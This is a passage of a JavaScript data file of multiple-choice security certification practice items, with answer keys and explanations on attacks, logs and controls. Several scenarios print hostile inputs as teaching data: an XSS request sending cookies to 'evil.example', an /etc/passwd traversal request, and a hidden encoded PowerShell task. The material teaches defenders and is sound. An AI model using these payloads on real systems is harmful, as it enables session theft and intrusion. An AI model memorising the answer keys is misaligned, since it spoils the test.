+pre:"Wireshark capture summary:\n192.168.1.1 is at AA:AA:AA:AA:AA:AA (broadcast, x1)\n192.168.1.1 is at BB:BB:BB:BB:BB:BB (broadcast, x1)\n192.168.1.1 is at BB:BB:BB:BB:BB:BB (broadcast, x1)\n192.168.1.1 is at BB:BB:BB:BB:BB:BB (broadcast, x1)\n(repeats every 2 seconds from workstation 192.168.1.55)",
+q:"A single host is repeatedly broadcasting conflicting ARP replies claiming to own the router's IP address with a MAC address that keeps overriding the legitimate one. What is this an example of?",
+c:["DNS spoofing","A MAC flooding attack","ARP poisoning","A rogue DHCP server"],a:2,
+e:"Repeatedly broadcasting unsolicited ARP replies that bind the router's IP to an attacker-controlled MAC address is ARP poisoning, used to redirect traffic through the attacker for an on-path attack.",
+w:["DNS spoofing manipulates name resolution responses, not Layer 2 IP-to-MAC bindings shown in ARP traffic.","MAC flooding overwhelms a switch's CAM table with many fake source MAC addresses to force it into flooding mode; this capture shows targeted ARP replies about one specific IP, not a flood of random MACs.","","A rogue DHCP server hands out fraudulent IP configuration during the DHCP lease process; this traffic is ARP activity, not DHCP."]},
+
+{i:2342,d:4,o:"4.9",t:"s",g:"log-source-selection",
+pre:"Security requirement: \"Identify every internal host that queried a known-malicious domain in the last 30 days, and correlate each lookup with the workstation's logged-in user at that time.\"\nAvailable sources: firewall NAT logs, DNS server logs, Active Directory sign-in logs, antivirus quarantine logs.",
+q:"Which combination of log sources would BEST satisfy this requirement?",
+c:["DNS server logs correlated with Active Directory sign-in logs","Firewall NAT logs alone","Antivirus quarantine logs alone","Firewall NAT logs correlated with antivirus quarantine logs"],a:0,
+e:"DNS logs show exactly which domains were queried and by which host, while AD sign-in logs show which user was logged into that host at the time, together fully answering both parts of the requirement.",
+w:["","NAT logs show translated IP-to-IP connections but not the domain name that was queried, and they contain no username information.","Antivirus quarantine logs only show files that were flagged as malicious; they would miss a query to a malicious domain that wasn't blocked by AV.","This pairing still lacks any domain-name visibility and still lacks user attribution, missing both parts of the requirement."]},
+
+{i:2343,d:3,o:"3.2",t:"s",g:"certificates",
+pre:"Certificate details:\nSubject: CN=portal.example.com\nIssuer: CN=Example Internal CA\nValid From: 2024-01-15  Valid To: 2025-01-14\nBrowser check performed: 2026-09-01",
+q:"A user's browser refuses to load the internal portal and shows a certificate warning. Based on the certificate details shown, what is the MOST likely cause?",
+c:["The certificate uses a weak cipher suite","The certificate was issued to the wrong subject","The certificate is missing a private key","The certificate has expired"],a:3,
+e:"The certificate's validity window ended on 2025-01-14, well before the 2026-09-01 check date, so the certificate has expired, triggering the browser warning.",
+w:["Cipher suite strength isn't shown in these details and wouldn't typically produce a hard browser block on its own the way an expired date does.","The subject (CN=portal.example.com) matches what a user browsing to that portal would expect, so subject mismatch isn't indicated here.","A missing private key would prevent the server from presenting the certificate at all during the TLS handshake, not produce a date-based warning; nothing here suggests a missing key.",""]},
+
+{i:2344,d:4,o:"4.6",t:"s",g:"iam",
+pre:"IAM Policy Statement (cloud storage bucket):\n{\n  \"Effect\": \"Allow\",\n  \"Principal\": \"*\",\n  \"Action\": \"s3:GetObject\",\n  \"Resource\": \"arn:aws:s3:::finance-reports/*\"\n}",
+q:"A cloud security review finds this policy attached to a storage bucket containing internal financial reports. What is the MOST significant issue?",
+c:["The Action is scoped too narrowly and blocks legitimate uploads","The Principal of \"*\" allows any user on the internet to read every object in the bucket","The Resource ARN is malformed and the policy will not apply","The Effect should be set to \"Deny\" instead of \"Allow\""],a:1,
+e:"A Principal value of \"*\" means the policy applies to literally anyone, authenticated or not. Combined with GetObject permission on every object in the bucket, this exposes confidential financial reports publicly.",
+w:["The policy only grants read (GetObject), not write, so it has no effect on uploads either way; that isn't the security problem here.","","The ARN pattern with a wildcard for objects inside the bucket is valid syntax and would apply correctly, which is exactly the problem.","Effect:Allow is intentional here since the goal is to grant read access to legitimate users; the flaw is who the access is being granted to, not the Allow/Deny choice."]},
+
+{i:2345,d:4,o:"4.9",t:"s",g:"endpoint-log-review",
+pre:"Scheduled Tasks (Windows Task Scheduler export):\nTaskName: OneDriveSyncHelper\nAuthor: SYSTEM\nAction: powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATw...\nTrigger: At log on of any user\nHidden: True",
+q:"An analyst finds this scheduled task on a workstation. Which characteristic is the STRONGEST indicator of malicious persistence?",
+c:["The task name referencing OneDrive","The task being triggered at logon","A hidden task running an encoded PowerShell command at every logon","The task being created by the SYSTEM account"],a:2,
+e:"Combining Hidden:True with a base64-encoded (-enc) PowerShell payload that fires automatically at every user logon is a well-known technique attackers use to disguise malicious code as routine activity and maintain persistence across reboots.",
+w:["Attackers frequently spoof legitimate-sounding names like OneDriveSyncHelper specifically to blend in; the name itself isn't the red flag, the hidden encoded payload is.","Logon triggers are common for entirely legitimate startup tasks too; on its own this is not suspicious.","","Many legitimate system tasks are created under the SYSTEM account; that alone doesn't indicate malicious intent without the hidden, encoded payload."]},
+
+{i:2346,d:2,o:"2.4",t:"s",g:"sql-injection-vuln",
+pre:"GET /search.asp?category=<scr"+"ipt>document.location='http://evil.example/steal?c='+document.cookie</scr"+"ipt> HTTP/1.1\nHost: shop.example.com",
+q:"Which vulnerability type does this request attempt to exploit?",
+c:["Cross-site scripting (XSS)","SQL injection","Server-side request forgery (SSRF)","LDAP injection"],a:0,
+e:"Injecting a <script> tag designed to run in the victim's browser and exfiltrate their session cookie to an attacker-controlled server is the defining behavior of cross-site scripting.",
+w:["","SQL injection targets database query syntax (quotes, UNION, comment markers), not embedded HTML/JavaScript tags.","SSRF tricks a server into making requests to internal or unintended destinations on the server's behalf; this payload targets the victim's browser, not the server's own outbound requests.","LDAP injection manipulates directory service query syntax, not client-side script execution."]},
+
+{i:2347,d:4,o:"4.4",t:"s",g:"log-analysis",
+pre:"SIEM correlation alert:\n- 2 failed VPN logins for user jmartin from Lagos, Nigeria at 08:14 UTC\n- 1 successful VPN login for user jmartin from Lagos, Nigeria at 08:16 UTC\n- 1 successful VPN login for user jmartin from Chicago, USA at 08:19 UTC\nUser jmartin's normal work location: Chicago, USA",
+q:"Which condition does this correlated alert MOST likely represent?",
+c:["A false positive caused by VPN load balancing","A scheduled maintenance window","A password expiration notice","Impossible travel"],a:3,
+e:"Two successful logins for the same account from geographically distant locations only three minutes apart is physically impossible to travel between, which is exactly what an impossible travel detection rule flags.",
+w:["VPN load balancing changes which gateway a session routes through but does not change the reported geolocation of the authenticating user between two real-world cities.","Nothing in the alert references planned maintenance; this is behavioral, account-based activity.","A password expiration notice would appear as a system message, not as successful logins from two different countries.",""]},
+
+{i:2348,d:2,o:"2.4",t:"s",g:"sql-injection-vuln",
+pre:"GET /show.asp?view=../../../../etc/passwd HTTP/1.1\nHost: intranet.example.com",
+q:"What type of vulnerability would be associated with this log entry?",
+c:["Buffer overflow","Directory traversal","Cross-site request forgery","Denial of service"],a:1,
+e:"The repeated ../ sequences attempt to climb out of the intended web root and reach a sensitive file (/etc/passwd) elsewhere on the file system, which is the defining pattern of a directory (path) traversal attack.",
+w:["A buffer overflow relies on oversized or malformed input designed to overwrite memory, not relative path sequences.","","Cross-site request forgery tricks an authenticated user's browser into submitting an unwanted request; this is a direct server-side path manipulation attempt, not a forged cross-site request.","Denial of service aims to exhaust resources or crash a service; a single crafted GET request for a file path is not a DoS pattern."]},
+
+{i:2349,d:4,o:"4.3",t:"s",g:"vulnerability-scan-output",
+pre:"Vulnerability scan summary:\nCVE-2024-11122 | CVSS 9.8 (Critical) | Remote code execution | Internet-facing web server | Patch available\nCVE-2023-08841 | CVSS 4.3 (Medium) | Info disclosure | Internal file server | Patch available\nCVE-2022-30017 | CVSS 7.5 (High) | DoS | Internal print server, offline for 6 months | Patch available",
+q:"Given limited patching resources this week, which finding should be remediated FIRST?",
+c:["CVE-2023-08841, because it was found most recently in the scan","CVE-2022-30017, because it has the oldest CVE number","CVE-2024-11122, the critical RCE on the internet-facing server","All three should be patched in numerical CVE order"],a:2,
+e:"Prioritization should weigh both severity and exposure. CVE-2024-11122 combines the highest CVSS score with remote code execution on a system directly reachable from the internet, making it the most urgent risk to the organization.",
+w:["Scan discovery order has no bearing on actual risk; prioritization should be driven by severity and exposure, not recency in a report.","CVE age is irrelevant to current risk, and this asset is also offline, meaning it currently poses no active exposure regardless of its CVSS score.","","Patching in numerical CVE order ignores both severity and exposure entirely and could leave a critical internet-facing RCE unpatched while the team works through an unrelated sequence."]},
+
+{i:2350,d:4,o:"4.9",t:"s",g:"cloud-access-logs",
+pre:"CloudTrail event:\nEventName: ConsoleLogin\nUserIdentity: root\nSourceIPAddress: 198.51.100.203\nMFAUsed: No\nEventTime: 2026-08-30T02:14:07Z",
+q:"A cloud security team reviewing this log entry should treat it as a HIGH-priority finding for which reason?",
+c:["The root account logged in directly without multifactor authentication","The login occurred outside business hours","The source IP address is external to the corporate network","The event was logged in UTC instead of local time"],a:0,
+e:"Direct root account logins are meant to be rare, tightly controlled, break-glass events. A root login without MFA is a severe control gap, since root has unrestricted privileges across the entire cloud account.",
+w:["","Time of day alone is a weak signal compared to the far more serious issue of an unprotected root-level login.","Cloud console logins are inherently over the internet from some external IP in normal use; the IP being external isn't itself the red flag.","Log timestamp format (UTC vs local) is a display detail and has no security relevance."]},
+
+{i:2351,d:4,o:"4.1",t:"s",g:"network-hardening",
+pre:"Switch port configuration:\nInterface: Gi0/3\nPort Security: Disabled\nSpanning Tree PortFast: Enabled\nDHCP Snooping: Disabled\nConnected device: Employee workstation in an open cubicle area",
+q:"Which single change would BEST reduce the risk of an unauthorized device being plugged into this port and gaining unrestricted network access?",
+c:["Enable Spanning Tree PortFast","Increase the port's speed and duplex settings","Change the port's VLAN to VLAN 1","Enable port security with a limit on allowed MAC addresses"],a:3,
+e:"Port security restricts which MAC addresses may communicate on a switchport and can shut the port down if an unrecognized device connects, directly addressing the risk of an unauthorized device being plugged in.",
+w:["PortFast only speeds up the transition to a forwarding state on access ports; it has no bearing on authorizing which devices may connect.","Speed and duplex settings affect performance, not access control.","VLAN 1 is the default, often poorly segmented VLAN; moving a port onto it would typically reduce, not improve, security posture.",""]},
+
+{i:2352,d:4,o:"4.9",t:"s",g:"email-header-analysis",
+pre:"Received-SPF: fail (domain of paypa1-secure.com does not designate 45.33.10.7 as permitted sender)\nDKIM-Signature: none\nFrom: \"PayPal Security\" <security@paypa1-secure.com>\nSubject: Your account has been limited - verify now",
+q:"Based on these email headers, which conclusion is BEST supported?",
+c:["The message passed all authentication checks and is legitimate","The message is very likely a spoofed phishing email","The sending domain simply has a temporary DNS outage","DKIM failure alone is not meaningful without also checking SPF"],a:1,
+e:"An SPF fail, no DKIM signature at all, a look-alike domain (paypa1-secure.com using the numeral 1 instead of the letter l), and urgent account-limitation language together are strong, classic indicators of a phishing attempt.",
+w:["The header explicitly shows Received-SPF: fail and no DKIM signature, the opposite of passing authentication.","","Nothing in the headers indicates a DNS outage; SPF fail means the sending server is not authorized for that domain at all, and the domain itself is a lookalike, not the real PayPal domain.","SPF already failed on its own, and combined with a missing DKIM signature and a spoofed lookalike domain, the evidence is more than sufficient without needing further checks."]},
+
+];
+
+const Q17 = [
+{i:2353,d:1,o:"1.2",t:"s",g:"access-control-vestibule",
+pre:"Access Control Vestibule Log:\n14:02:03 - Outer door (Door A) unlocked, badge validated\n14:02:07 - Door A closed and locked\n14:02:08 - Weight sensor confirms single occupant\n14:02:09 - Inner door (Door B) unlocked",
+q:"Which physical security control does this log describe?",
+c:["Access control vestibule","Turnstile","Bollard","Fencing"],a:0,
+e:"An access control vestibule (mantrap) only unlocks the second door after the first is fully closed and a single occupant is confirmed, exactly matching the sequential door logic and occupancy check in this log.",
+w:["","A turnstile mechanically limits passage to one person per rotation but does not use a two-door interlock sequence like the one shown here.","Bollards are fixed posts that stop vehicles; they have no doors, badges, or occupancy sensors.","Fencing is a perimeter barrier and has no relationship to sequential door unlocking or occupancy sensing."]},
+
+{i:2354,d:2,o:"2.1",t:"s",g:"threat-actor-profile",
+pre:"SOC case notes:\nInitial access: single spear-phishing email to two R&D engineers\nDwell time before first lateral movement: 6 weeks\nTechniques: custom malware, no reused public tooling, avoided all EDR-monitored hosts\nData targeted: unpublished chemical formulas\nNo ransom note, no data listed for sale on any forum",
+q:"Which threat actor type is MOST consistent with this activity?",
+c:["Unskilled attacker","Nation-state","Hacktivist","Organized crime"],a:1,
+e:"Custom tooling, extended patience, deliberate evasion of detection, and a clear intent to steal specific intellectual property rather than extort or resell it are hallmarks of a well-resourced nation-state or advanced persistent threat, not a lower-sophistication actor.",
+w:["An unskilled attacker typically relies on off-the-shelf tools and lacks the patience or capability for a 6-week stealth campaign with custom malware.","","Hacktivists act for a visible cause and usually publicize or deface something; nothing here reflects a political statement or public disclosure.","Organized crime is financially motivated and generally moves toward monetization such as ransom or resale; there is no ransom demand or data-for-sale activity here."]},
+
+{i:2355,d:2,o:"2.2",t:"s",g:"removable-device-vector",
+pre:"USB device log:\n02:14 AM - Unknown USB Mass Storage Device connected to FIN-WS-04\nDevice serial: not in asset inventory\nAutorun.inf executed automatically\nEvent occurred outside scheduled business hours",
+q:"Which threat vector does this event represent?",
+c:["Supply chain","Open service port","Removable device","Default credentials"],a:2,
+e:"An unregistered USB storage device plugged directly into a workstation, triggering autorun, is the textbook definition of the removable device threat vector.",
+w:["Supply chain compromise involves a vendor, MSP, or supplier introducing risk through a business relationship, not a random USB device plugged into a single workstation.","Open service ports involve network-exposed listening services, not physical media inserted into a machine.","","Default credentials refer to unchanged factory usernames and passwords, which has nothing to do with a USB device executing autorun."]},
+
+{i:2356,d:2,o:"2.3",t:"s",g:"buffer-overflow-vuln",
+pre:"Application crash log:\nEXCEPTION_ACCESS_VIOLATION at 0x0041FA22\nCopy operation attempted to write 4096 bytes into a fixed 256-byte input buffer\nStack corruption detected immediately following the write",
+q:"Which vulnerability type does this crash log MOST likely indicate?",
+c:["Race condition","Memory injection","Misconfiguration","Buffer overflow"],a:3,
+e:"Writing far more data (4096 bytes) than a fixed-size buffer can hold (256 bytes), followed by stack corruption, is the defining signature of a buffer overflow.",
+w:["A race condition (TOC/TOU) involves a timing gap between checking and using a resource, not an oversized write into a fixed buffer.","Memory injection typically involves injecting and executing code into a running process's memory space rather than simply overrunning a buffer's boundary through oversized input.","A misconfiguration is an incorrect security setting, not a memory-safety defect triggered by input size.",""]},
+
+{i:2357,d:2,o:"2.4",t:"s",g:"dns-amplification-ddos",
+pre:"NetFlow summary:\nAttacker sends 60-byte DNS query (spoofed source: victim IP) to 500 open DNS resolvers\nEach resolver returns a 4,200-byte response directly to the victim\nVictim receives over 2GB of unsolicited DNS traffic in under one minute",
+q:"Which type of attack does this traffic pattern represent?",
+c:["Amplified DDoS","Reflected DDoS only","On-path attack","Credential replay"],a:0,
+e:"A small spoofed query that triggers a much larger response (60 bytes in, 4,200 bytes out) sent to the victim via many open resolvers is amplification, specifically DNS amplification, where the response size dwarfs the request.",
+w:["","Reflection is the spoofing mechanism used, but the dramatic size increase from 60 bytes to 4,200 bytes per resolver is specifically what makes this an amplification attack rather than a plain reflection.","An on-path attack requires the attacker to intercept traffic between two parties; this is a flood of traffic to a victim, not interception.","Credential replay reuses captured authentication material; nothing here involves credentials at all."]},
+
+{i:2358,d:2,o:"2.4",t:"s",g:"password-spraying",
+pre:"Authentication log:\n09:00:01 Failed login: alice / Winter2026!\n09:00:02 Failed login: bmartinez / Winter2026!\n09:00:03 Failed login: cwong / Winter2026!\n09:00:04 Failed login: dpatel / Winter2026!\n(same single password attempted once against 200 different user accounts within 90 seconds)",
+q:"Which password attack technique is shown in this log?",
+c:["Brute-force attack","Password spraying","Credential stuffing","Pass-the-hash"],a:1,
+e:"One password tried once against many different accounts is password spraying, designed to stay under per-account lockout thresholds while still testing a huge number of accounts.",
+w:["Brute-force attacks try many passwords against a single account; this log shows the opposite pattern, one password against many accounts.","","Credential stuffing replays previously breached username/password pairs; this log shows one guessed password applied broadly, not stolen credential pairs.","Pass-the-hash reuses a captured hash to authenticate without submitting a password at all, which would not appear as a stream of failed password attempts."]},
+
+{i:2359,d:2,o:"2.5",t:"s",g:"firewall-hardening",
+pre:"Firewall change ticket:\nBefore: Rule 1 - ANY source, ANY destination, ANY port - ALLOW\nAfter: Rule 1 - 10.0.0.0/24 source, TCP/443 destination - ALLOW; Rule 2 - ANY ANY ANY - DENY (implicit deny added)",
+q:"Which mitigation technique does this change BEST demonstrate?",
+c:["Segmentation","Isolation","Hardening via configuration enforcement","Decommissioning"],a:2,
+e:"Replacing an overly permissive any-any-any rule with a narrowly scoped allow and an explicit implicit-deny rule is configuration enforcement, a hardening technique that reduces the attack surface to only what's required.",
+w:["Segmentation divides a network into separate zones or VLANs; this change is a rule edit on a single firewall, not a network division.","Isolation separates a specific host or system from the rest of the network entirely, which is not what a general rule tightening accomplishes.","","Decommissioning is the retirement of an asset; nothing here is being taken out of service."]},
+
+{i:2360,d:3,o:"3.1",t:"s",g:"cloud-responsibility-matrix",
+pre:"Cloud responsibility matrix (IaaS model):\nPhysical data center security - Provider\nHypervisor and physical network - Provider\nGuest operating system patching - Customer\nApplication-level data encryption - Customer",
+q:"Under this IaaS shared responsibility model, who is responsible for patching the guest operating system?",
+c:["The cloud provider","Both parties equally, with no distinction","Neither party; the OS auto-patches by default","The customer"],a:3,
+e:"In IaaS, the provider secures the physical infrastructure and hypervisor, but the customer owns everything from the guest OS upward, including OS patching, exactly as this responsibility matrix states.",
+w:["The provider's responsibility in IaaS stops at the physical infrastructure and hypervisor layer; the matrix explicitly lists OS patching under Customer.","The matrix draws a clear line rather than shared 50/50 ownership; each row is assigned to one party.","IaaS does not include automatic guest OS patching as a built-in provider service; that responsibility falls to the customer per the matrix.",""]},
+
+{i:2361,d:3,o:"3.2",t:"s",g:"waf-log-analysis",
+pre:"Security appliance alert:\nBlocked request matching OWASP Core Rule Set rule 942100 (SQL Injection Attack Detected)\nHost: api.example.com\nAction: HTTP 403 Forbidden returned to client\nLayer: HTTP request/response inspection",
+q:"Which type of device MOST likely generated this alert?",
+c:["Web application firewall (WAF)","Next-generation firewall (NGFW)","Unified threat management (UTM) appliance","Network-based IDS"],a:0,
+e:"Inspection tied to OWASP Core Rule Set signatures and blocking at the HTTP request/response layer for a specific web application is the defining function of a WAF, which is purpose-built to understand and filter application-layer web traffic.",
+w:["","An NGFW adds application awareness and intrusion prevention across general network traffic, but OWASP CRS rule matching on HTTP requests to a specific API host is the signature of a WAF specifically, not a general-purpose NGFW.","A UTM bundles many broader security functions (firewall, antivirus, content filtering) into one appliance; the OWASP CRS rule ID points specifically to WAF-style web application filtering.","A network-based IDS only alerts and does not block; this alert explicitly returned a 403 Forbidden, meaning the traffic was blocked, not merely flagged."]},
+
+{i:2362,d:3,o:"3.3",t:"s",g:"data-masking",
+pre:"Customer service export log:\nCard Number: 4111-XXXX-XXXX-1111\nSSN: XXX-XX-6789\nEmail: j***n@example.com\nOriginal values remain unchanged in the production database; only this exported view is altered",
+q:"Which data protection method is shown in this export?",
+c:["Tokenization","Data masking","Hashing","Encryption"],a:1,
+e:"Masking hides part of a sensitive value in a displayed or exported view (showing only the last four digits, for example) while leaving the original data untouched in the source system, exactly what this export demonstrates.",
+w:["Tokenization replaces the real value everywhere it is stored with a substitute token mapped back through a separate vault; this export still shows partial real digits rather than a fully substituted token.","","Hashing produces a fixed-length, irreversible digest that looks nothing like the original value; partially visible digits like 1111 rule out hashing.","Encryption would render the value completely unreadable ciphertext without a key, not selectively visible digits like this export shows."]},
+
+{i:2363,d:3,o:"3.4",t:"s",g:"backup-testing",
+pre:"Backup job log:\n02:00 - Full backup completed successfully (4.2TB)\n02:00 daily - Incremental backup completed successfully (avg. 80GB)\nDefined RPO: 4 hours / Defined RTO: 2 hours\nLast successful recovery test performed: 11 months ago",
+q:"Given this log, which finding represents the GREATEST risk to the organization's resilience posture?",
+c:["The full backup size of 4.2TB","The RPO of 4 hours","The 11-month gap since the last recovery test","The incremental backup frequency"],a:2,
+e:"Backups that have never been recently tested for successful restoration provide false confidence; if the org can't demonstrate an actual working recovery within the RTO, the backup strategy is unproven regardless of how often backups run.",
+w:["Backup size alone says nothing about whether a restore would actually succeed within the required time.","An RPO of 4 hours is simply a target; it isn't inherently a problem on its own without more context.","","Incremental backups running daily is a normal, healthy cadence and isn't concerning by itself."]},
+
+{i:2364,d:4,o:"4.2",t:"s",g:"asset-disposal-sanitization",
+pre:"Asset disposal record:\nAsset: Dell PowerEdge R740, Serial: XJ4821\nSanitization method: NIST SP 800-88 Purge (cryptographic erase + degauss)\nCertificate of Sanitization: Issued by Vendor #4471, signed and dated\nData retention hold status: None",
+q:"Which asset management activity does this record MOST directly satisfy?",
+c:["Enumeration","Assignment and accounting","Acquisition and procurement","Disposal and decommissioning with certification"],a:3,
+e:"A documented sanitization method following an approved standard, paired with a signed certificate confirming the data was properly destroyed, is exactly what disposal and decommissioning with certification requires.",
+w:["Enumeration is the process of identifying and cataloging assets in use, not documenting how a retired asset was destroyed.","Assignment and accounting track who owns an asset while it's in service, not its end-of-life sanitization.","Acquisition and procurement covers how an asset is obtained, the opposite end of the asset lifecycle from disposal.",""]},
+
+{i:2365,d:4,o:"4.5",t:"s",g:"dlp-tooling",
+pre:"DLP alert:\nRule triggered: Credit-Card-Pattern-16digit\nAction: Outbound email attachment blocked\nMatches found: 40 instances of 16-digit card number pattern\nSender: finance@corp.com  |  Recipient: personal external email address",
+q:"Which security tool MOST likely generated this alert?",
+c:["Data loss prevention (DLP)","DMARC","Network access control (NAC)","Endpoint detection and response (EDR)"],a:0,
+e:"Inspecting outbound content for sensitive data patterns like credit card numbers and blocking the transmission before it leaves the organization is the core function of DLP.",
+w:["","DMARC governs email authentication and spoofing protection based on sender domain alignment, not scanning attachment content for sensitive data patterns.","NAC controls which devices are allowed onto the network based on posture and identity, not outbound content inspection.","EDR focuses on detecting and responding to malicious activity on endpoints, not scanning outbound email content for sensitive data patterns."]},
+
+{i:2366,d:4,o:"4.5",t:"s",g:"dmarc-alignment",
+pre:"Email authentication report:\nSPF: pass\nDKIM: pass\nDMARC: fail (identifier alignment failure - visible From: domain does not match the SPF/DKIM authenticated domain)\nPolicy applied: p=reject",
+q:"What does this report BEST illustrate about DMARC?",
+c:["DMARC independently re-checks message content for malware","DMARC can fail even when SPF and DKIM individually pass, because it also requires domain alignment","DMARC replaces the need for both SPF and DKIM","DMARC only applies to internal email, not external senders"],a:1,
+e:"DMARC's unique job is enforcing that the domain a recipient actually sees in the From: field matches the domain that SPF or DKIM authenticated, which is why a message can pass SPF and DKIM individually yet still fail DMARC on alignment, as shown here.",
+w:["DMARC evaluates authentication and alignment, not the message body or attachments for malware.","","DMARC builds on top of SPF and DKIM as an alignment and policy layer; it doesn't make either of the underlying protocols unnecessary.","DMARC policies are published in DNS and evaluated by any receiving mail server, regardless of whether the sender is internal or external."]},
+
+{i:2367,d:4,o:"4.6",t:"s",g:"pam-jit-access",
+pre:"PAM audit log:\nAccount: svc_backup requested elevated access to DB-PROD-01\nAccess granted for a 45-minute window via a system-generated credential\nCredential automatically expired and revoked at end of window\nAll commands during the session were recorded",
+q:"Which privileged access management concept does this log demonstrate?",
+c:["Federation","Attribute-based access control","Just-in-time permissions with ephemeral credentials","Single sign-on"],a:2,
+e:"Granting elevated access only for a limited window using a temporary, auto-expiring credential is exactly what just-in-time permissions and ephemeral credentials are designed to do, minimizing the time any privileged credential remains valid.",
+w:["Federation allows identities from one trusted domain to access resources in another; nothing here involves a separate identity provider or cross-domain trust.","Attribute-based access control makes decisions from a combination of subject, resource, and environmental attributes; this log is about a time-boxed elevation, not an attribute-driven policy decision.","","Single sign-on lets one authentication event grant access to multiple applications; this log describes a single, temporary privilege elevation, not a broader authentication session."]},
+
+{i:2368,d:4,o:"4.7",t:"s",g:"cicd-guardrails",
+pre:"CI/CD pipeline log:\nStage: Build - PASS\nStage: Static application security testing (SAST) - 2 CRITICAL findings\nStage: Deploy to production - BLOCKED automatically\nA ticket was auto-created in the issue tracker; no human intervened at any step",
+q:"Which benefit of automation and orchestration does this pipeline demonstrate?",
+c:["Reduced technical debt","Employee retention","Workforce multiplier through user provisioning","Guard rails enforcing a security baseline before deployment"],a:3,
+e:"The pipeline automatically stopped a risky deployment the moment critical findings were detected, without waiting for a person to notice, which is exactly what automated guard rails are meant to do: enforce a required security standard before something reaches production.",
+w:["Technical debt refers to accumulated shortcuts in code or infrastructure over time; this log is about a real-time deployment gate, not a measure of accumulated debt.","Employee retention is a workforce/HR benefit sometimes attributed to automation reducing burnout, not something demonstrated by a single blocked deployment.","This log has nothing to do with provisioning user accounts; it's a deployment safety gate.",""]},
+
+{i:2369,d:4,o:"4.8",t:"s",g:"incident-response-lifecycle",
+pre:"Incident timeline:\n09:14 - Ransomware detected on FS-03 (Detection)\n09:20 - FS-03 isolated from the network via NAC (Containment)\n09:45 - Malicious binary and persistence mechanisms removed (Eradication)\n11:00 - FS-03 restored from a clean backup and returned to service (Recovery)",
+q:"Per the incident response process, which activity should the team perform NEXT?",
+c:["Lessons learned","Preparation","Analysis","Containment"],a:0,
+e:"After recovery, the incident response process concludes with lessons learned, a review of what happened and how the response can improve, which is the only phase in this timeline not yet completed.",
+w:["","Preparation happens continuously and before an incident occurs, not as a step that follows recovery.","Analysis happens earlier in the process, typically alongside or right after detection, to understand scope and cause, not after the system has already been restored.","Containment already occurred at 09:20, earlier in this same timeline; the process does not return to an earlier phase after recovery."]},
+
+{i:2370,d:4,o:"4.9",t:"s",g:"packet-capture-cleartext",
+pre:"Packet capture summary:\nProtocol: HTTP (port 80, unencrypted)\nPOST /login HTTP/1.1\nBody: username=admin&password=Summer2026!\nSource: internal workstation  |  Destination: legacy internal application server",
+q:"What does this packet capture MOST clearly reveal?",
+c:["A successful multifactor authentication bypass","Credentials transmitted in cleartext over an unencrypted protocol","A DNS cache poisoning attempt","A directory traversal attack"],a:1,
+e:"The login request travels over plain HTTP rather than HTTPS, so the username and password are fully readable in the packet capture, exposing credentials in cleartext to anyone able to observe the traffic.",
+w:["Nothing in the capture references any multifactor authentication step at all, successful or bypassed.","","DNS poisoning involves manipulating name resolution responses; this capture is an HTTP login request, unrelated to DNS.","Directory traversal involves path manipulation sequences like ../../ in a request; this request is a straightforward login POST, not a path-based attack."]},
+
+{i:2371,d:5,o:"5.2",t:"s",g:"qualitative-risk-analysis",
+pre:"Risk register entry:\nRisk: Legacy ERP server unsupported since 2022\nLikelihood: High  |  Impact: High\nAssessment method: High/Medium/Low rating matrix, no dollar-value calculations performed\nCurrent treatment: None assigned",
+q:"Which type of risk analysis is being used in this risk register entry?",
+c:["Quantitative","Annualized loss expectancy-based","Qualitative","Exposure factor-based"],a:2,
+e:"Rating likelihood and impact using descriptive levels like High, Medium, and Low, without calculating specific dollar figures, is the defining characteristic of qualitative risk analysis.",
+w:["Quantitative analysis assigns actual numeric or monetary values, such as SLE or ALE, to a risk; this entry explicitly uses a rating matrix with no dollar figures.","ALE is a quantitative calculation (SLE times ARO) and would appear as a specific number, not a High/Medium/Low rating.","","Exposure factor is a quantitative input representing the percentage of asset value lost in a single event, not a qualitative rating label."]},
+
+{i:2372,d:5,o:"5.5",t:"s",g:"pentest-environment-knowledge",
+pre:"Penetration test rules of engagement excerpt:\nTester provided: network diagrams, IP address ranges, and a standard low-privilege user account\nTester NOT provided: application source code or internal design documentation\nStated goal: simulate an insider threat with baseline network access",
+q:"Which type of penetration test environment does this scope describe?",
+c:["Unknown environment","Known environment","Passive reconnaissance only","Partially known environment"],a:3,
+e:"Giving the tester some information (network diagrams, IP ranges, a baseline account) while withholding other information (source code, design docs) is the definition of a partially known environment test, often called gray-box testing.",
+w:["An unknown environment (black-box) test gives the tester little to no internal information at all, not diagrams, IP ranges, and a working account.","A known environment (white-box) test provides full internal knowledge, including things like source code and design documentation, which this scope explicitly withholds.","Passive reconnaissance is a phase of information gathering that avoids direct interaction with the target; this scope explicitly grants an active account and defines an insider-simulation goal, which goes beyond passive recon.",""]},
+
+];
+
+const Q18 = [
+{i:2373,d:1,o:"1.1",t:"s",g:"control-type-detective",
+pre:"Physical security log:\n02:14 - Motion sensor triggered at rear loading dock\n02:14 - CCTV recording initiated automatically\n02:15 - Alert sent to on-call security guard's phone\n02:22 - Guard arrives on scene, no intruder found (false alarm - stray cat)",
+q:"Which control TYPE do the motion sensor and automatic CCTV recording represent?",
+c:["Detective","Preventive","Deterrent","Corrective"],a:0,
+e:"The sensor and camera identify and record activity after it is already occurring; they don't stop entry and aren't intended to discourage it in the moment, which is the definition of a detective control.",
+w:["","Preventive controls stop an event before it happens, like a locked door; here the sensor and camera only detect and record after motion is already occurring.","Deterrents discourage an attempt through visible presence, like warning signage or lighting; a sensor triggering a hidden recording doesn't discourage anyone in the moment, it just captures evidence.","Corrective controls restore or fix something after an incident, like restoring from backup; nothing was fixed or restored here, only recorded and reported."]},
+
+{i:2374,d:1,o:"1.3",t:"s",g:"change-management-backout",
+pre:"Change record:\nChange: Upgrade core switch firmware\nApproval: Yes (CAB approved)\nTest results: Attached\nMaintenance window: Saturday 1-3 AM\nBackout plan: [BLANK]",
+q:"Which missing element of this change record poses the GREATEST risk if the firmware upgrade fails at 1:30 AM?",
+c:["Approval signature","Backout plan","Test results","Maintenance window"],a:1,
+e:"A backout plan is the documented path back to a known-working state if a change fails. Without one, a failed 1:30 AM firmware upgrade has no defined recovery path.",
+w:["Approval was already obtained from the CAB, so it isn't the missing piece creating risk here.","","Test results are attached, meaning testing was already completed prior to the change.","A maintenance window is explicitly defined (Saturday 1-3 AM), so scheduling isn't the gap."]},
+
+{i:2375,d:1,o:"1.4",t:"s",g:"hash-integrity-verification",
